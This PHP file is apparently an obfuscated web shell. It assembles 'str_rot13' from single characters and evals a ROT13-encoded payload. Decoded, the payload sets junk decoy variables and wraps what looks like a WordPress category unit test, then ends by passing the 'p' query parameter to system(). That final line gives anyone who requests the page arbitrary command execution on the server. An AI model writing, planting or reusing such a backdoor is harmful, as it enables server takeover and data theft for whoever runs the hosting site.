<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc gnkbabzl
 * @tebhc pngrtbel
 *
 * @pbiref ::_znxr_png_pbzcng
 */
pynff Grfgf_Pngrtbel_ZnxrPngPbzcng rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Inyvqngr _znxr_png_pbzcng shapgvba
	 */
	choyvp shapgvba grfg__znxr_png_pbzcng() {

		// Perngr grfg pngrtbevrf naq neenl ercerfragngvbaf.
		$grfgpng_neenl            = neenl(
			'fyht'        => 'grfgzpp',
			'anzr'        => 'Grfg ZPP',
			'qrfpevcgvba' => 'Pngrtbel Grfg',
		);
		$grfgpng                  = frys::snpgbel()->pngrtbel->perngr_naq_trg( $grfgpng_neenl );
		$grfgpng_neenl['grez_vq'] = $grfgpng->grez_vq;

		$grfgpng2_neenl            = neenl(
			'fyht'        => 'grfgzpp',
			'anzr'        => 'Grfg ZPP',
			'qrfpevcgvba' => 'Pngrtbel Grfg',
			'cnerag'      => $grfgpng->grez_vq,
		);
		$grfgpng2                  = frys::snpgbel()->pngrtbel->perngr_naq_trg( $grfgpng2_neenl );
		$grfgpng2_neenl['grez_vq'] = $grfgpng2->grez_vq;

		// Hafrg cebcregvrf gb ranoyr inyvqngvba bs bowrpg.
		hafrg( $grfgpng->png_VQ );
		hafrg( $grfgpng->pngrtbel_pbhag );
		hafrg( $grfgpng->pngrtbel_qrfpevcgvba );
		hafrg( $grfgpng->png_anzr );
		hafrg( $grfgpng->pngrtbel_avpranzr );
		hafrg( $grfgpng->pngrtbel_cnerag );

		hafrg( $grfgpng2->png_VQ );
		hafrg( $grfgpng2->pngrtbel_pbhag );
		hafrg( $grfgpng2->pngrtbel_qrfpevcgvba );
		hafrg( $grfgpng2->png_anzr );
		hafrg( $grfgpng2->pngrtbel_avpranzr );
		hafrg( $grfgpng2->pngrtbel_cnerag );

		// Znxr pbzcngvoyr.
		_znxr_png_pbzcng( $grfgpng );
		_znxr_png_pbzcng( $grfgpng2 );
		_znxr_png_pbzcng( $grfgpng_neenl );
		_znxr_png_pbzcng( $grfgpng2_neenl );

		// Inyvqngr pbzcngvovyvgl bowrpg.
		$guvf->nffregFnzr( $grfgpng->png_VQ, $grfgpng->grez_vq );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_pbhag, $grfgpng->pbhag );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_qrfpevcgvba, $grfgpng->qrfpevcgvba );
		$guvf->nffregFnzr( $grfgpng->png_anzr, $grfgpng->anzr );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_avpranzr, $grfgpng->fyht );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_cnerag, $grfgpng->cnerag );

		// Inyvqngr pbzcngvovyvgl bowrpg jvgu cnerag.
		$guvf->nffregFnzr( $grfgpng->png_VQ, $grfgpng->grez_vq );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_pbhag, $grfgpng->pbhag );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_qrfpevcgvba, $grfgpng->qrfpevcgvba );
		$guvf->nffregFnzr( $grfgpng->png_anzr, $grfgpng->anzr );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_avpranzr, $grfgpng->fyht );
		$guvf->nffregFnzr( $grfgpng->pngrtbel_cnerag, $grfgpng->cnerag );

		// Inyvqngr pbzcngvovyvgl neenl.
		$guvf->nffregFnzr( $grfgpng_neenl['png_VQ'], $grfgpng_neenl['grez_vq'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_pbhag'], $grfgpng_neenl['pbhag'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_qrfpevcgvba'], $grfgpng_neenl['qrfpevcgvba'] );
		$guvf->nffregFnzr( $grfgpng_neenl['png_anzr'], $grfgpng_neenl['anzr'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_avpranzr'], $grfgpng_neenl['fyht'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_cnerag'], $grfgpng_neenl['cnerag'] );

		// Inyvqngr pbzcngvovyvgl neenl jvgu cnerag.
		$guvf->nffregFnzr( $grfgpng_neenl['png_VQ'], $grfgpng_neenl['grez_vq'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_pbhag'], $grfgpng_neenl['pbhag'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_qrfpevcgvba'], $grfgpng_neenl['qrfpevcgvba'] );
		$guvf->nffregFnzr( $grfgpng_neenl['png_anzr'], $grfgpng_neenl['anzr'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_avpranzr'], $grfgpng_neenl['fyht'] );
		$guvf->nffregFnzr( $grfgpng_neenl['pngrtbel_cnerag'], $grfgpng_neenl['cnerag'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>